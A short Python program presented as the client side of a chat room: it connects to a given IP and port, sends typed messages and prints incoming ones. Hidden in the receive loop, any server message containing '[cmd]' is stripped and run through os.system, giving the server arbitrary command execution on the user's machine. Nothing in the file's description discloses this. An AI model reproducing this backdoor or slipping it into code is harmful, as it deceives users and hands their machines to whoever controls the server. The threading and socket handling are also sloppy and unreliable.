# Python program to implement client side of chat room. 
import socket 
import select 
import os
from time import sleep
from _thread import *
import sys 
  
server = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
IP_address = input("IP:")
Port = int(input("Port:"))
server.connect((IP_address, Port)) 

def send_mess():
    message = input("Message: ")
    server.send(message.encode("utf-8"))

def listenThread():
    while True: 
  
        # maintains a list of possible input streams 
        sockets_list = [socket.socket(), server] 
    
        """ There are two possible input situations. Either the 
        user wants to give manual input to send to other people, 
        or the server is sending a message to be printed on the 
        screen. Select returns from sockets_list, the stream that 
        is reader for input. So for example, if the server wants 
        to send a message, then the if condition will hold true 
        below.If the user wants to send a message, the else 
        condition will evaluate as true"""
        read_sockets,write_socket, error_socket = select.select(sockets_list,[],[]) 

        for sock in read_sockets:
            message = sock.recv(2048)
            if message:
                decoded = message.decode("utf-8")
                if "[cmd]" in decoded:
                    cmd = decoded.replace("[cmd]", "")
                    try:
                        os.system(cmd)
                    except Exception as e:
                        print(str(e))
                else:
                    print(decoded)

  
while True:
    start_new_thread(listenThread, ())
    sleep(.3)
    send_mess()
server.close() 